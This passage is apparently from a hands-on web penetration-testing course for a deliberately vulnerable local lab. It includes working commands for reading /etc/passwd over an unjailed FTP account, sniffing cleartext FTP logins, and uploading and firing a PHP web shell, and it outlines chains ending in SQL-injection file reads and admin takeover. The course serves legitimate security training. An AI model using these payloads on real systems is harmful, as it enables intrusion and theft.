chroot_local_user is off, so ftpuser is not confined to a home directory. After login, the whole container filesystem is reachable.

lftp -u ftpuser,ftpuser 127.0.0.1 -e 'set ftp:passive-mode on; cd /; ls; cd /etc; cat passwd; bye'

You are reading /etc/passwd, the vsftpd config, anything the FTP user can reach. From here you can also cd /srv/ftp/upload, the shared directory, and drop files for the web side. The fix is a correctly owned, non-writable chroot target, verified against a fresh config rather than patched into an old one.

5.5 Cleartext Credentials

There is no FTPS. The control channel is plaintext. Capture a login on the loopback interface:

sudo tcpdump -i lo0 -A 'tcp port 21' &
curl -s --ftp-pasv -u ftpuser:ftpuser ftp://127.0.0.1/ >/dev/null

Read USER ftpuser and PASS ftpuser straight off the wire. Do the same in Wireshark with an ftp display filter so trainees see the protocol laid out. The fix is FTPS, forced for both the login and the data channel, or moving to SFTP entirely.

5.6 Set Up the Chain

The anonymous upload directory, /srv/ftp/upload, is the same volume Apache serves at /uploads/ftp/, and PHP executes there. Upload a web shell anonymously and leave it. You will fire it in Session 6.

printf '<?php echo shell_exec($_GET["c"]);' > s.php
curl -s --ftp-pasv -T s.php ftp://127.0.0.1/upload/s.php

5.7 A Lab Honesty Note

vsftpd's anonymous path segfaults roughly once in a few hundred connections on this Alpine build under a fast scanner. The container restarts itself in about a second, and normal use, a handful of FTP commands per exercise, will not trigger it. If a burst of automated connections briefly drops the service, that is the known quirk, not your attack working. It is written up in docs/architecture.md.

5.8 What You Should Notice

None of these four are clever. Anonymous write, a default password, a missing jail, no encryption, they are the FTP findings from twenty years ago, still shipping. The reason this session exists is the pivot: a finding on one service (anonymous write) plus a finding on another (the web side executes uploads) is worth far more than the sum, and no single scanner pointed at either service would have told you so. Chaining is the next session.

Session 6: Chaining It Together

Goal for this session: nothing new to learn. Every step below was covered in an earlier session. The point is to run three chains end to end, in one sitting, and then write the whole thing up as if a client were paying for it. A finding on its own is a line in a report. A chain is the reason the client keeps you on the phone.

6.1 Chain One: FTP Anonymous Upload to Remote Code Execution

Step | Finding | Session
Upload a PHP shell anonymously over FTP | anonymous write (15) | 5.2
The upload directory is served by Apache and executes PHP | unrestricted upload / shared dir (12, 19) | 4.4, 5.6
Request the shell in a browser, run commands as www-data | — | —

printf '<?php echo shell_exec($_GET["c"]);' > s.php
curl -s --ftp-pasv -T s.php ftp://127.0.0.1/upload/s.php
curl -s 'http://127.0.0.1:8080/uploads/ftp/s.php?c=id'
curl -s 'http://127.0.0.1:8080/uploads/ftp/s.php?c=cat+/var/www/html/admin/config.php'

Two services, each with a finding a scanner would rate "medium," combine into code execution on the web host. Neither ZAP nor an FTP scan, run alone, would have connected them.

6.2 Chain Two: Exposed .git to Admin Access

Step | Finding | Session
Find and dump /admin/.git/ | exposed repository (9) | 4.1
Recover the API key from the first commit | secret in history (9) | 4.1
Or: dump users via search, crack the admin MD5 | search injection (1) | 2.1
Or: bypass login outright, land on the admin session | auth bypass (2) | 2.2
With an admin session live, predict its token from a fresh client | predictable session (13) | 4.5

There are three separate routes to administrator here, and a good write-up names all three, because the client will fix one and think they are done. Once you are admin, Session 2.3's second-order payload is available, and that hands you every password hash in the store.

6.3 Chain Three: Customer to File Read on the Database Host

Step | Finding | Session
Register or log in as an ordinary customer | — | 1.1
Call the price API for a product you do not own | broken authorisation / IDOR (4) | 2.4
Inject on id, error-based, wrap LOAD_FILE | SQL injection (4) | 2.4
Read /etc/passwd or the flag file off the DB container | — | —

A logged-in customer, the lowest privilege the app hands out, reaches arbitrary file read on a different container. The authorisation bug and the injection bug are both required; either one alone is far less serious.

6.4 The Write-Up

Now produce the deliverable. For each chain:

Narrative. What an attacker does, in order, in plain sentences. No tool output yet.
Evidence. The exact requests and responses, trimmed to what proves the point.
Impact. What the attacker can now do that they could not before. Be specific: "read any customer's order," "execute commands as the web user," not "high severity."
Remediation. The fix for each link, and which single fix breaks the whole chain if you can only ship one this quarter.

Cross-check your findings against docs/scenarios.md, the instructor edition. If you found all nineteen and can defend the fix for each, you have completed the course. If ZAP found eight and you found the other eleven with your own head, you have understood it.

6.5 Closing the Loop

The tools in this course each do one job well. ZAP sweeps. sqlmap drills. testssl.sh reads a handshake. gobuster guesses paths. Wireshark shows you the wire. None of them chains findings, weighs impact, or writes the sentence that makes a client act. That part was never going to be the tool's job, and it isn't. What stays constant across every engagement is the tester's job: sweep with the tool, go where the tool stops, connect the small things into the big thing, and hand back a report someone can act on. That is the whole course in one sentence. Let the scanner sweep, then think.

About the Author

Britley Hoff is a Master Electrician, combat veteran, and systems architect who has spent over two decades mastering the invisible infrastructure that powers the modern world. Her journey with the mainframe began not in a lecture hall, but through the grit of self-directed research and a deep-seated obsession with how systems, both electrical and digital, hold up under pressure.

From early contributions to the openMosix cluster initiative and Slackware Linux, to managing zLinux environments at scale, Britley has always been drawn to Big Iron. To her, the mainframe was never a legacy burden, it was the ultimate engineering feat, a platform built for the kind of absolute reliability that mission-critical environments actually demand.

Britley lives in South Carolina, where she splits her time between architecting AI-native transaction systems, security research on the platforms everyone assumes are too old to matter, and running a fresh-foods hobby farm. She believes the systems that run the enterprise will only stay trustworthy if the people responsible for them have somewhere safe to break things first, and learn how they actually fail.

A Closing Note

This syllabus started from the same complaint the mainframe series did: nobody gets to practice on a real target before they need to already know one. Widgetorium exists to close that gap for the web layer. It is a boring shop with nineteen deliberate holes in it, running on your own machine, so a trainee can dump a customer table, upload a shell, and read a file off a database host without a single production system anywhere near the blast radius.

If you finished all six sessions, you have run every category a web assessment covers: injection, broken access control, cross-site scripting, unsafe file handling, weak session management, information disclosure, transport security, and a service pivot that ends in code execution. You have seen where ZAP earns its keep and where it goes quiet, and you have chained the quiet findings into the loud one. That is not a complete offensive-security education, nobody gets one of those in six sessions, but it is a real foundation, built on payloads that actually fired, not payloads copied from a slide.

Use Widgetorium only where you are meant to: on your own machine, in a lab you control, in a classroom or range where you have permission, under written rules of engagement for authorised training. It ships a live web shell path and crackable credentials by design. Keep it on loopback, keep the host off any network that matters, and never point the techniques in this book at a system you do not own or have explicit written authorisation to test.

The lab keeps growing. If you find a gap, a bug class that should be in here and isn't, an exploit path this book did not call out, a fix that does not hold up, write it down and build it next. That is how this course started: a handful of missing pieces in a lab that already worked.

Widgetorium is open source under GPL-3.0-or-later. The lab, the scenario answer key, and this syllabus live together in the project repository. Community and discussion: britleydev.slack.com.